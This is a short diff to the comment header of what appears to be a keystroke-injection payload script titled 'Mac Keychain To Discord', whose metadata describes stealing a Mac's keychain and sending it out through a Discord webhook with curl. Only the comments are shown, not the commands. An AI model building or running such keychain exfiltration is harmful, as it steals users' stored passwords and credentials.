@@ -1,5 +1,9 @@
-REM MAC KEYCHAIN EXFILTRATION VIA DISCORD WEBHOOK
-REM CREATED BY ECTO-1A
+RREM Title: Mac Keychain To Discord
+REM Author: Ecto-1A
+REM Description: Exfiltrates the keychain from a Mac computer via Discord Webhook
+REM Target: Mac OS 
+REM Version 1.0
+REM Category: Exfiltration
 
 REM This script assumes that you have the "curl" command installed on your Mac. 
 REM You will need to replace <webhook URL> with the URL of the Discord webhook you want to use.
